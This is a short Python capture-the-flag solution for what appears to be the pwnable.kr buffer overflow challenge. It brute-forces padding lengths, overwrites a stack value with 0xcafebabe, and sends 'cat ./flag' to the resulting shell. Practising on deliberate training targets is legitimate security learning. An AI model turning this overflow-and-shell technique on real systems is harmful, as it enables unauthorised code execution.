#!/usr/bin/python
# -*- coding: UTF-8 -*-

from CTFServer import *

for i in range(32, 100):
    print('Trying ' + str(i))
    s = CTFServer('pwnable.kr', 9000)
    s.send(i * 'X' + '\xBE\xBA\xFE\xCA' + '\n')
    s.send('cat ./flag' + '\n')
    response = s.recv()
    if 'Nah' not in response and 'stack smashing detected' not in response:
        break
